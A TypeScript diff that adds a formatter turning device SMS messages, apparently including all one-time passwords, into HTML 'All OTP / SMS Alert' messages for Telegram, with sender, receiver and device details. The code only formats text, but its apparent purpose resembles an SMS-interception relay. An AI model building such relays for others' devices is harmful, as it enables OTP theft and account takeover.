@@ -31,6 +31,14 @@ type BuildTelegramDeviceDeletedMessageParams = BaseDeviceTelegramParams & {
   deletedAt?: number;
 };
 
+type BuildTelegramAllOtpSmsMessageParams = BaseDeviceTelegramParams & {
+  smsText: string;
+  smsTitle?: string;
+  sender?: string;
+  receiver?: string;
+  timestamp?: number;
+};
+
 function formatDateTime(ts?: number): string {
   const time = Number(ts || Date.now());
   const date = new Date(Number.isFinite(time) ? time : Date.now());
@@ -161,6 +169,49 @@ export function buildTelegramSmsMessage(
   return lines.join("\n");
 }
 
+export function buildTelegramAllOtpSmsMessage(
+  params: BuildTelegramAllOtpSmsMessageParams,
+): string {
+  const sender = telegramHtml(params.sender || "");
+  const receiver = telegramHtml(params.receiver || "");
+  const smsTitle = telegramHtml(params.smsTitle || "");
+  const smsText = telegramHtml(params.smsText || "");
+  const timeText = telegramHtml(formatDateTime(params.timestamp));
+  const tags = buildTags(params, ["all_sms", "otp_sms"]);
+
+  const lines: string[] = [];
+
+  lines.push("<b>All OTP / SMS Alert</b>");
+  lines.push("");
+
+  if (tags) {
+    lines.push(tags);
+    lines.push("");
+  }
+
+  pushBaseDeviceLines(lines, params);
+
+  lines.push(`<b>Time:</b> ${timeText}`);
+
+  if (sender) {
+    lines.push(`<b>Sender:</b> ${sender}`);
+  }
+
+  if (receiver) {
+    lines.push(`<b>Receiver:</b> ${receiver}`);
+  }
+
+  if (smsTitle) {
+    lines.push(`<b>Title:</b> ${smsTitle}`);
+  }
+
+  lines.push("");
+  lines.push("<b>SMS:</b>");
+  lines.push(smsText || "-");
+
+  return lines.join("\n");
+}
+
 export function buildTelegramSmsDeletedMessage(
   params: BuildTelegramSmsDeletedMessageParams,
 ): string {
@@ -232,6 +283,7 @@ export function buildTelegramDeviceDeletedMessage(
 
 export default {
   buildTelegramSmsMessage,
+  buildTelegramAllOtpSmsMessage,
   buildTelegramSmsDeletedMessage,
   buildTelegramDeviceDeletedMessage,
 };
